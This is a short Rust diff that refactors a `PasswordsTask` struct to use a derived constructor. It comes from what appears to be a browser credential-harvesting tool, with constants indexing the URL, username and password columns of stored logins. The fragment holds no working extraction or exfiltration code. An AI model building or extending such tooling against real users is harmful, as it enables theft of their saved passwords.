@@ -4,6 +4,7 @@ use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use derive_new::new;
 use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
@@ -14,14 +15,9 @@ const LOGINS_ORIGIN_URL: usize = 0;
 const LOGINS_USERNAME_VALUE: usize = 3;
 const LOGINS_PASSWORD_VALUE: usize = 5;
 
+#[derive(new)]
 pub(super) struct PasswordsTask {
     browser: Arc<BrowserData>,
-}
-
-impl PasswordsTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for PasswordsTask {
